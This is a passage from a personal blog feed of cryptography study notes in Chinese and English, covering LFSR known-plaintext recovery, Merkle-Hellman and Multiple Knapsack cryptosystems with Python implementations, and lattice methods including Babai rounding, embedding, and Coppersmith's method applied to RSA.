class="line">            print(<span class="string">'lsfr_&#123;&#125;.png ok!'</span>.format(key_length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more-1">More</h4><p>exp对应2020i春秋公益赛的一道lfsr-kpa（已知png文件头，与cipher异或即可将问题转化为lfsr-kpa问题）</p><p>lfsr-kpa可以不局限于开头，密钥流中任意段已知2n个bit均可进行抽头序列的猜测（lfsr在已知n个连续比特和抽头序列的情况下一定能恢复完整密钥流）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About Knapsack</title>
      <link href="/2020/03/02/About-Knapsack/"/>
      <url>/2020/03/02/About-Knapsack/</url>
      
        <content type="html"><![CDATA[<h3 id="basis">Basis</h3><p>基于子集和问题 - <span class="math inline">\(a_{1}x_{1}+...+a_{n}x_{n}=E;\quad x_{i}\in\{0,1\}.\)</span></p><p>Proved to be NP-hard.</p><p>但Merkle-Hellman cryptosystem存在trapdoor.</p><h4 id="merkle-hellman-cryptosystem">Merkle-Hellman cryptosystem</h4><p><strong>Key-Generation</strong></p><p>有随机超递增序列<span class="math inline">\(w=(w_{1},w_{2},...,w_{n})\)</span>，随机数<span class="math inline">\(q&gt;\sum w_{i}\)</span>及随机数r (gcd(r, q) = 1)</p><p>即定义序列<span class="math inline">\(\beta\)</span>中的元素<span class="math inline">\(\beta_{i}\equiv rw_{i}(mod\ q),i\in[1,n]\)</span>. 公钥<span class="math inline">\(\beta\)</span>，私钥<span class="math inline">\((w,q,r)\)</span>.</p><p><strong>Encryption</strong></p><p>n-bit明文<span class="math inline">\(\alpha=(\alpha_{1},\alpha_{2},...,\alpha_{n})\)</span>. 密文<span class="math inline">\(c=\sum\alpha_{i}\beta_{i}\)</span>.</p><p><strong>Decryption</strong></p><p><span class="math inline">\(c&#39;\equiv cr^{-1}\equiv \sum\alpha_{i}w_{i}(mod\ q)\)</span>.</p><p>则由<span class="math inline">\(\sum\alpha_{i}w_{i}&lt;q\)</span>及超递增序列w易知，令j从n-1到0，背包当前容量为c时，</p><ol type="1"><li><p><span class="math inline">\(c&lt;w[j]\rightarrow m[j]=0,j--;\)</span></p></li><li><p><span class="math inline">\(c\geq w[j]\rightarrow m[j]=1,c-=w[j],j--;\)</span></p></li></ol><p>即可恢复出明文m.</p><p><strong>More Version</strong></p><p>选取一个permutation <span class="math inline">\(\pi\)</span>，在生成的<span class="math inline">\(\beta\)</span>序列后，再令<span class="math inline">\(\beta&#39;_{i}=\beta_{\pi(i)}\)</span>. 公开序列则为<span class="math inline">\(\beta&#39;\)</span>. 持有私钥加入<span class="math inline">\(\pi\)</span>.</p><h3 id="the-multiple-knapsack-cryptosystem">The Multiple Knapsack Cryptosystem</h3><h4 id="key-generation">Key-Generation</h4><p>私钥 - 六元组<span class="math inline">\((A,B,E,p,u,v)\)</span>，公钥 - 三元组<span class="math inline">\((F,G,H)\)</span>.</p><p>其中私钥<span class="math inline">\(A(\{a_i\}),B(\{b_i\}),C(\{c_i\})\)</span>满足Condition 1, 2：</p><p><strong>Condition 1.</strong> <span class="math display">\[a_{k}\leq \sum_{i=1}^{k-1}a_{i},b_{k}\leq \sum_{i=1}^{k-1}b_{i}\quad (\forall k\in\{2,3,...,n\}).\]</span> <strong>Condition 2.</strong> <span class="math display">\[e_{k}&gt;-a_{k}b_{k}+(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})+(\sum_{i=1}^{k-1}e_{i})\\-b_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})-a_{1}(2^{n-1}-2^{k-1})(b_{k}-\sum_{i=1}^{k-1}b_{i}).\]</span> [Q] - paper里提出的是<span class="math inline">\(a_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})\)</span>及<span class="math inline">\(b_{1}...\)</span>，但decryption原理推导时，个人感觉存在一定问题...故此处与paper不一.</p><p><strong>Algorithm (Generate A,B,E)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenPriKnapsack</span><span class="params">(n)</span>:</span></span><br><span class="line">    a1, b1, e1 = getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">    A, B, E = [a1], [b1], [e1]</span><br><span class="line">    a, b, e = a1, b1, e1</span><br><span class="line">    sum_a, sum_b, sum_e = a, b, e</span><br><span class="line">    tmp = <span class="number">2</span> ** (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">        a = getRandomRange(sum_a // <span class="number">2</span>, sum_a)</span><br><span class="line">        b = getRandomRange(sum_b // <span class="number">2</span>, sum_b)</span><br><span class="line">        met = -a * b + sum_a * sum_b + sum_e - (tmp - <span class="number">2</span> ** (i + <span class="number">1</span>)) * (b1 * (a - sum_a) + a1 * (b - sum_b))</span><br><span class="line">        e = met + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">        sum_a += a</span><br><span class="line">        sum_b += b</span><br><span class="line">        sum_e += e</span><br><span class="line">        A.append(a)</span><br><span class="line">        B.append(b)</span><br><span class="line">        E.append(e)</span><br><span class="line">    <span class="keyword">return</span> A, B, E</span><br></pre></td></tr></table></figure><p>由Condition 1我们有<span class="math inline">\(a_{k}b_{k}\leq (\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})\)</span>，且能由此和Condition 2推出<span class="math inline">\(e_{k}&gt;\sum_{i=1}^{k-1}e_{i}\)</span>. (Superincreasing)</p><p><strong>Algorithm (Generate p,u,v)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = (sum_a * sum_b + sum_e) + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">s = size(p) // <span class="number">2</span></span><br><span class="line">u, v = getPrime(s), getPrime(s)</span><br><span class="line"><span class="keyword">while</span> GCD(u, p) != <span class="number">1</span> <span class="keyword">or</span> GCD(v, p) != <span class="number">1</span>:</span><br><span class="line">    u, v = getPrime(s), getPrime(s)</span><br></pre></td></tr></table></figure><p><strong>Algorithm (Generate F,G,H)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F = [(u * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> A]</span><br><span class="line">G = [(v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> B]</span><br><span class="line">H = [(u * v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> E]</span><br></pre></td></tr></table></figure><h4 id="encryption">Encryption</h4><p><span class="math inline">\(M=(m_{1},m_{2},...,m_{n})\)</span>，有<span class="math inline">\(C:=(\sum_{i=1}^{n}f_{i}m_{i})(\sum_{i=1}^{n}g_{i}m_{i})+\sum_{i=1}^{n}h_{i}m_{i}\)</span>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(pubkey, m)</span>:</span></span><br><span class="line">    F, G, H = pubkey</span><br><span class="line">    n = len(F)</span><br><span class="line">    m = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(m))[<span class="number">2</span>:]]</span><br><span class="line">    m = [<span class="number">0</span>] * ((<span class="number">8</span> - len(m) % <span class="number">8</span>) % <span class="number">8</span>) + m</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m), n):</span><br><span class="line">        block_m = m[i : i + n]</span><br><span class="line">        <span class="keyword">if</span> len(block_m) != n:</span><br><span class="line">            padding = [getRandomRange(<span class="number">0</span>, <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n - len(block_m))]</span><br><span class="line">            block_m += padding</span><br><span class="line">        fm, gm, hm = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            fm += F[i] * block_m[i]</span><br><span class="line">            gm += G[i] * block_m[i]</span><br><span class="line">            hm += H[i] * block_m[i]</span><br><span class="line">        block_c = fm * gm + hm</span><br><span class="line">        c.append(hex(block_c)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h4 id="decryption">Decryption</h4><p><span class="math inline">\(D(C):=u^{-1}v^{-1}C(mod\ p)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}\)</span>.</p><p>由Condition 1. 知，<span class="math inline">\(\sum_{i=1}^{k}a_{i}\leq 2^{k-1}a_{1},\sum_{i=1}^{k}b_{i}\leq 2^{k-1}b_{1}\)</span>，有</p><p><span class="math inline">\(\because\sum_{i=1}^{k}a_{i}=2^{k-1}a_{1}-\Delta\quad\therefore\sum_{i=1}^{n}a_{i}\leq 2^{n-1}a_{1}-2^{n-k}\Delta\)</span>.</p><p><span class="math inline">\(\therefore\sum_{i=k+1}^{n}a_{i}=\sum_{i=1}^{n}a_{i}-\sum_{i=1}^{k}a_{i}\leq a_{1}(2^{n-1}-2^{k-1})\)</span>. 同理<span class="math inline">\(\sum_{i=k+1}^{n}b_{i}\leq b_{1}(2^{n-1}-2^{k-1})\)</span>.</p><p>又由<span class="math inline">\((a_{k}-\sum_{i=1}^{k-1}a_{i})\leq 0,(b_{k}-\sum_{i=1}^{k-1}b_{i})\leq 0\)</span>及Condition 2. 知， <span class="math display">\[e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})-(\sum_{i=1}^{k-1}e_{i})\\+(\sum_{i=k+1}^{n}b_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i})+(\sum_{i=k+1}^{n}a_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i})&gt;0.\]</span> 可知上式为下式的充分条件 <span class="math display">\[e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=1}^{k-1}b_{i}m_{i})-(\sum_{i=1}^{k-1}e_{i}m_{i})\\+(\sum_{i=k+1}^{n}b_{i}m_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i}m_{i})+(\sum_{i=k+1}^{n}a_{i}m_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i}m_{i})&gt;0.\]</span> 又等价为 <span class="math display">\[(\sum_{i=k+1}^{n}a_{i}m_{i}+\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=k+1}^{n}b_{i}m_{i}+\sum_{i=1}^{k-1}b_{i}m_{i})+(\sum_{i=k+1}^{n}e_{i}m_{i}+\sum_{i=1}^{k-1}e_{i}m_{i})\\&lt;(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{1}\]</span> 且在<span class="math inline">\(m_{k}=1\)</span>时，有另一显然成立的不等式如下 <span class="math display">\[D(C)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}\\\geq(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{2}\]</span></p><p>由(1)(2)有以下解密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(prikey, c)</span>:</span></span><br><span class="line">    A, B, E, u, v, p = prikey</span><br><span class="line">    n = len(A)</span><br><span class="line">    u_inv = inverse(u, p)</span><br><span class="line">    v_inv = inverse(v, p)</span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> block_c <span class="keyword">in</span> c:</span><br><span class="line">        block_m = <span class="string">""</span></span><br><span class="line">        Dc = (u_inv * v_inv * int(block_c, <span class="number">16</span>)) % p</span><br><span class="line">        am, bm, em = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            d = (am + A[k]) * (bm + B[k]) + (em + E[k])</span><br><span class="line">            <span class="keyword">if</span> Dc &gt;= d:</span><br><span class="line">                block_m += <span class="string">"1"</span></span><br><span class="line">                am += A[k]</span><br><span class="line">                bm += B[k]</span><br><span class="line">                em += E[k]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                block_m += <span class="string">"0"</span></span><br><span class="line">        m = m + block_m[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(int(m, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="code-for-test">Code For Test</h4><p><a href="MKS.py">MKS.py</a></p><h3 id="attack-on-the-mks-cryptosystem">Attack on the MKS Cryptosystem</h3><p>由于私钥A，B具有相同的非超递增性质，所以证其一即可，我们令m为一小于n的正整数，定义以下在<span class="math inline">\(N^{m}\)</span>上的向量： <span class="math display">\[f=(f_{1},...,f_{m}),a=(a_{1},...,a_{m})\]</span> 由于攻击者仅知公钥F部分，未知私钥A，但有同余关系<span class="math inline">\(f\equiv ua(mod\ p)\)</span>，因此给出以下引理：</p><h4 id="lemma-1">Lemma 1</h4><p>令向量<span class="math inline">\(x\in Z^{m}\)</span>，若<span class="math inline">\(x\perp f\)</span>，则有<span class="math inline">\(x\perp a\)</span>或<span class="math inline">\(\|x\|\geq \frac{p}{\|a\|}\)</span>.</p><p><strong>Proof.</strong> 有<span class="math inline">\(&lt;x,f&gt;\equiv 0(mod\ p)\)</span>，若假设x不与a正交，则有<span class="math inline">\(|&lt;x,a&gt;|\geq p\)</span>（因为<span class="math inline">\(gcd(u,p)=1\)</span>），再由柯西不等式可知<span class="math inline">\(P\leq \|x\|\|a\|\)</span>.</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-2</title>
      <link href="/2020/02/29/Lattice-Learning-2/"/>
      <url>/2020/02/29/Lattice-Learning-2/</url>
      
        <content type="html"><![CDATA[<h2 id="chapter-3-algorithm-for-the-closest-and-shortest-vector-problems">Chapter 3 Algorithm for the Closest and Shortest Vector Problems</h2><h3 id="babais-rounding-technique">3.1 Babai's Rounding Technique</h3><p><strong>Theorem 3.1.1.</strong> Given a vector we can write <span class="math inline">\(\underline{\omega}=\sum_{i=1}^{n}\alpha_{i}\underline{b_{i}}\)</span> with <span class="math inline">\(\alpha_{i}\in R\)</span>. The rounding technique is simply to set <span class="math display">\[\underline{v}=\sum_{i=1}^{n}\lfloor \alpha_{i}\rceil\underline{b_{i}}\]</span> <span class="math inline">\(\left\|\underline{v}-\underline{w}\right\|\)</span> is within an exponential factor of the minimal value if the basis is LLL-Reduced. The method trivially generalises to non-full-rank lattices as long as <span class="math inline">\(\underline{\omega}\)</span> lies in the R-span of the basis.</p><p><strong>Theorem 3.1.2.</strong> Let <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> be an LLL-Reduced basis (with factor <span class="math inline">\(\delta=\frac{3}{4}\)</span>) for a Lattice <span class="math inline">\(L\subset R^{n}\)</span>. Then the output <span class="math inline">\(\underline{v}\)</span> of the Babai rounding method on input <span class="math inline">\(\underline{\omega}\in R^{n}\)</span> satisfies <span class="math display">\[\left\|\underline{\omega}-\underline{v}\right\|\leq (1+2n(9/2)^{n/2})\left\|\underline{\omega}-\underline{u}\right\|\]</span> for all <span class="math inline">\(\underline{u}\in L\)</span>.</p><h3 id="the-embedding-technique">3.2 The Embedding Technique</h3><p><strong>Theorem 3.2.1.</strong> Embedding's solution to the CVP corresponds to integers <span class="math inline">\(l_{1},...,l_{n}\)</span> such that <span class="math display">\[\underline{\omega}\approx\sum_{i=1}^{n}l_{i}\underline{b_{i}}\]</span> The idea is to define a lattice L' that contains the short vector <span class="math inline">\(\underline{e}(\underline{e}=\underline{\omega}-\sum_{i=1}^{n}l_{i}\underline{b_{i}})\)</span>. Let <span class="math inline">\(M\in R_{&gt;0}\)</span> (usually let M=1). The lattice L' is defined by the vectors (which are a basis for <span class="math inline">\(R^{n+1}\)</span>) <span class="math display">\[(\underline{b_{1}},0),...,(\underline{b_{n}},0),(\underline{\omega},M)\]</span> Hence, we might be able to find <span class="math inline">\(\underline{e}\)</span> by solving the SVP problem in the lattice L'. Then we can solve the CVP by subtracting <span class="math inline">\(\underline{e}\)</span> from <span class="math inline">\(\underline{\omega}\)</span>.</p><p>Example: the CVP whose basis is for <span class="math inline">\(R^{1}\)</span></p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001321511.png"></p><p>add <span class="math inline">\((\underline{\omega},M)\)</span> to define L' in <span class="math inline">\(R^{2}\)</span></p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001737673.png"></p><p>solving the SVP to find <span class="math inline">\(\delta\)</span></p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001826288.png"></p><p><strong>Lemma 3.2.2.</strong> Let <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> be a basis for a lattice <span class="math inline">\(L\subset Z^{n}\)</span> and donate by <span class="math inline">\(\lambda_1\)</span> the shortest Euclidean length of a non-zero element of L. Let <span class="math inline">\(\underline{\omega}\in R^{n}\)</span> and let <span class="math inline">\(\underline{v}\in L\)</span> be a closest lattice point to <span class="math inline">\(\underline{\omega}\)</span>. Define <span class="math inline">\(\underline{e}=\underline{\omega}-\underline{v}\)</span>. Suppose that <span class="math inline">\(\left\|\underline{e}\right\|&lt;\lambda_1/2\)</span> and let <span class="math inline">\(M=\left\|\underline{e}\right\|\)</span>. Then <span class="math inline">\((\underline{e},M)\)</span> is a shortest non-zero vector in the lattice L' of the embedding technique.</p><p>Proof: All vectors in L' are of the form <span class="math display">\[l_{n+1}(\underline{e},M)+\sum_{i=1}^{n}l_{i}(\underline{b}_{1},0)\]</span> for some <span class="math inline">\(l_{i}\in Z\)</span>. It is clear that every non-zero vector with <span class="math inline">\(l_{n+1}=0\)</span> is of length at least <span class="math inline">\(\lambda_{1}\)</span>.</p><p>Since <span class="math inline">\(\left\|(\underline{e},M)\right\|^{2}=\left\|\underline{e}\right\|^{2}+M^{2}=2M^{2}&lt;\frac{\lambda^{2}}{2}\)</span>, the vector <span class="math inline">\((\underline{e},M)\)</span> has length at most <span class="math inline">\(\frac{\lambda_1}{\sqrt{2}}\)</span>. Since <span class="math inline">\(\underline{v}\)</span> is a closest vector to <span class="math inline">\(\underline{\omega}\)</span> in the lattice L, <span class="math inline">\(\forall_{\underline{x}\in L},s.t.\left\|\underline{e}\right\|\leq \left\|\underline{e}+\underline{x}\right\|\)</span>. SVP's correctness proved.</p><h3 id="korkine-zolotarev-bases">3.3 Korkine-Zolotarev Bases</h3><blockquote><p>Schnorr has developed the block Korkine-Zolotarev lattice basis reduction algorithm, which computes a Korkine-Zolotarev basis for small dimensional projections of the original lattice and combines this with the LLL algorithm. The output basis can be proved to be of a better quality than an LLL-reduced basis. This is the most powerful algorithm for fifinding short vectors in lattices of large dimension.</p></blockquote><h2 id="chapter-4-coppersmiths-method-and-related-applications">Chapter 4 Coppersmith's Method and Related Applications</h2><h3 id="coppersmiths-method-for-modular-univariate-polynomials">4.1 Coppersmith’s Method for Modular Univariate Polynomials</h3><h4 id="first-steps-to-coppersmiths-method">4.1.1 First Steps to Coppersmith’s Method</h4><p>Let <span class="math inline">\(F(x)=x^{d}+a_{d-1}x^{d-1}+...+a_{1}x+a_{0}\)</span> be a monic polynomial of degree d with integer coefficients. Suppose we know that there exist one or more integers <span class="math inline">\(x_{0}\)</span> such that <span class="math inline">\(F(x)\equiv 0(mod\ M)\)</span> and that <span class="math inline">\(x_{0}&lt;M^{\frac{1}{d}}\)</span>. The problem is to find all such roots.</p><p>Since <span class="math inline">\(|x_{0}^{i}|&lt;M\)</span> for all <span class="math inline">\(0\leq i\leq d\)</span> then, if the coefficients of F(x) are small enough, one might have <span class="math inline">\(F(x_{0})=0\)</span> over Z. In this case, the problem can be easily solved by Newton's method (round the approximations of the roots to the nearest integer and check whether they are solutions of F(x)). However, we wanna deal with polynomials F(x) having a small solution but whose coefficients are not small.</p><p>Coppersmith’s idea is to build from F(x) a polynomial <strong>G(x)</strong> that still has the same solution <span class="math inline">\(x_{0}\)</span>, but which has <strong>coefficients small enough</strong>.</p><p><strong>Theorem 4.1.1.</strong> (Howgrave-Graham [296]) Let <span class="math inline">\(M, X\in N\)</span> and let <span class="math inline">\(F(x)=\sum_{i=0}^{d}a_{i}x^{i}\in Z[x]\)</span>. Suppose <span class="math inline">\(x_{0}\in Z\)</span> is a solution to <span class="math inline">\(F(x)\equiv 0(mod\ M)\)</span> such that <span class="math inline">\(|x_{0}|&lt;X\)</span>. We associate with the polynomial F(x) the row vector <span class="math inline">\(b_F=(a_0,a_{1}X,a_{2}X^{2},...,a_{d}X^{d})\)</span>. If <span class="math inline">\(\left\|b_{F}\right\|&lt;\frac{M}{\sqrt{d+1}}\)</span> then <span class="math inline">\(F(x_{0})=0\)</span>.</p><p><strong>Proof:</strong> Cauchy-Schwarz inequality <span class="math inline">\(\rightarrow\sum_{i=1}^{n}x_{i}\leq \sqrt{n\sum_{i=1}^{n}x_{i}^{2}}\)</span>.</p><p>So, <span class="math inline">\(|F(x_{0})|=|\sum_{i=0}^{d}a_{i}x_{0}^{i}|\leq \sum_{i=0}^{d}|a_{i}||x_{0}|^{i}\leq \sum_{i=0}^{d}|a_{i}|X^{i}\leq \sqrt{d+1}\left\|b_{F}\right\|&lt;\sqrt{d+1}\frac{M}{\sqrt{d+1}}=M\)</span>.</p><p><span class="math inline">\(\therefore F(x_{0})=0\)</span>.</p><p>Then how to transform F(x) to G(x) we need?</p><p>To do this, consider the d+1 polynomials <span class="math inline">\(G_{i}(x)=Mx^{i}\)</span> for <span class="math inline">\(0\leq i&lt;d\)</span> and F(x). They all have the solution <span class="math inline">\(x=x_{0}\)</span> module M. Define the lattice L with the basis B <span class="math display">\[B=\left( \begin{matrix}   M &amp; 0 &amp; ... &amp; 0 &amp; 0 \\   0 &amp; MX &amp; ... &amp; 0 &amp; 0 \\   ... &amp; ... &amp; ... &amp; ... &amp; ... \\   0 &amp; 0 &amp; ... &amp; MX^{d-1} &amp; 0 \\   a_0 &amp; a_1X &amp; ... &amp; a_{d-1}X^{d-1} &amp; X^{d}  \end{matrix} \right).\]</span> <strong>Theorem 4.1.2.</strong> Let G(x) be the polynomial corresponding to the first vector <span class="math inline">\(\underline{b}_{1}\)</span> in the LLL-Reduced basis for L. Set <span class="math inline">\(c_{1}(d)=2^{-\frac{1}{2}}(d+1)^{-\frac{1}{d}}\)</span>. If <span class="math inline">\(X&lt;c_{1}(d)\cdot M^{\frac{2}{d(d+1)}}\)</span> then any root <span class="math inline">\(x_{0}\)</span> of F(x) module M such that <span class="math inline">\(|x_{0}|\leq X\)</span> satisfies <span class="math inline">\(G(x_{0})=0\)</span> in Z. (i.e., if <span class="math inline">\(\sqrt{d+1}\cdot 2^{\frac{d}{4}}\cdot X^{\frac{d}{2}}&lt;M^{\frac{1}NaN}\)</span>, ...)</p><h4 id="the-full-coppersmith-method">4.1.2 The Full Coppersmith Method</h4><p>Compared to previous section, some benefits can be obtained by using x-shifts. (Get larger X)</p><p><strong>Theorem 4.1.3.</strong> (Coppersmith) Let <span class="math inline">\(0&lt;\epsilon&lt;min\{0.18,\frac{1}{d}\}\)</span>. Let F(x) be a monic polynomial of degree d with one or more small roots <span class="math inline">\(x_{0}\)</span> module M such that <span class="math inline">\(|x_{0}|&lt;\frac{1}{2}M^{\frac{1}{d}-\epsilon}\)</span>. Then <span class="math inline">\(x_{0}\)</span> can be found in time bounded by a polynomial in d, <span class="math inline">\(\frac{1}{\epsilon}\)</span> and log(M).</p><h3 id="multivariate-modular-polynomial-equations">4.2 Multivariate Modular Polynomial Equations</h3><p><strong>Theorem 4.2.1.</strong> Let <span class="math inline">\(F(x,y)\in Z[x,y]\)</span> be a polynomial of total degree d (i.e., every monomial <span class="math inline">\(x^{i}y^{j}\)</span> satisfies <span class="math inline">\(i+j\leq d\)</span>). Let <span class="math inline">\(X,Y,M\in N\)</span> be such that <span class="math inline">\(XY&lt;M^{\frac{1}{d}-\epsilon}\)</span> for some <span class="math inline">\(0&lt;\epsilon &lt;\frac{1}{d}\)</span>. Then one can compute (in time polynomial in log(M) and <span class="math inline">\(\frac{1}{\epsilon}&gt;d\)</span>) polynomials <span class="math inline">\(F_{1}(x,y),F_{2}(x,y)\in Z[x,y]\)</span> such that, for all <span class="math inline">\((x_{0},y_{0})\in Z^{2}\)</span> with <span class="math inline">\(|x_{0}|&lt;X,|y_{0}|&lt;Y\)</span> and <span class="math inline">\(F(x_{0},y_{0})\equiv 0(mod\ M)\)</span>, one has <span class="math inline">\(F_{1}(x_{0},y_{0})=F_{2}(x_{0},y_{0})=0\)</span> over Z.</p><h3 id="bivariate-integer-polynomials">4.3 Bivariate Integer Polynomials</h3><p><strong>Theorem 4.3.1.</strong> Let <span class="math inline">\(F(x,y)\in Z[x,y]\)</span> and let <span class="math inline">\(d\in N\)</span> be such that <span class="math inline">\(deg_{x}(F(x,y)),deg_{y}(F(x,y))\leq d\)</span>. Write <span class="math display">\[F(x,y)=\sum_{0\leq i,j\leq d}F_{i,j}x^{i}y^{j}\]</span> For <span class="math inline">\(X,Y\in N\)</span>, we define <span class="math display">\[W=max_{0\leq i,j\leq d}|F_{i,j}|X^{i}Y^{j}\]</span> If <span class="math inline">\(XY&lt;W^{\frac{2}{3d}}\)</span> then there is an algorithm that takes as input F(x,y),X,Y, runs in time (bit operations) bounded by a polynomial in log(W) and <span class="math inline">\(2^{d}\)</span>, and outputs all pairs <span class="math inline">\((x_{0},y_{0})\in Z^{2}\)</span> such that <span class="math inline">\(F(x_{0},y_{0})=0,|x_0|\leq X,|y_0|\leq Y\)</span>.</p><h3 id="some-applications-of-coppersmiths-method">4.4 Some Applications of Coppersmith’s method</h3><h4 id="fixed-padding-schemes-in-rsa">4.4.1 Fixed Padding Schemes in RSA</h4><p>It is necessary to use padding schemes for RSA encryption and one simple proposal for k-bit RSA moduli is to take a k' bit message and pad it by putting (k-k'-1) ones to the left hand side of it. This padding scheme is sometimes called <strong>fixed pattern padding</strong>. <span class="math display">\[F(x)=(2^{k}-2^{k&#39;}+x)^{e}-c\equiv 0(mod\ N)\]</span> Then if <span class="math inline">\(|x|&lt;\frac{1}{2}N^{\frac{1}{e}}(k&#39;&lt;\frac{k}{e}-1)\)</span>, Coppersmith's method can solve it in polynomial time.</p><h4 id="factoring-n-pq-with-partial-knowledge-of-p">4.4.2 Factoring N = pq with Partial Knowledge of p</h4><p>Given an approximation <span class="math inline">\(\tilde{p}\)</span> to p such that <span class="math inline">\(p=\tilde{p}+x_{0}\)</span> where <span class="math inline">\(|x_{0}|&lt;X\)</span>. The polynomial <span class="math inline">\(F(x)=(x+\tilde{p})\)</span> has a small solution module p. The problem is that we don’t know p, but we do know a multiple of p (i.e., N). The idea is to form a lattice corresponding to polynomials that have a small root modulo p and to apply Coppersmith’s method to find this root <span class="math 